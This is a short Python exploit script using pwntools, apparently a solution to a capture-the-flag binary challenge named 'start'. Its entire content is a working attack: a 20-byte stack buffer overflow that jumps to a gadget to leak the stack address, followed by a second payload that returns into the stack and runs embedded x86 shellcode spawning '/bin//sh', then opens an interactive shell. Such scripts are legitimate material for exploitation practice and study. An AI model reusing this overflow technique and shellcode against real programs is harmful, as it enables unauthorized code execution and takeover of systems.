#!/usr/bin/env python
        
from pwn import *
                            
                                
path = '/home/jy/pwn/start'
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
gad = 0x8048087 #mov %esp,%ecx
                                                                    
def Exploit(path):
    p = process(path)
    p.recv()
    payload= "A"*20+p32(gad)
    p.send(payload)
    leak = u32(p.recv(4))
    payload = 'A'*20+p32(leak+0x18)+"DEAD"+'\x31\xd2'+shellcode
    p.send(payload)
    p.interactive("\nshell# ")
                                                                                                                           
Exploit(path)
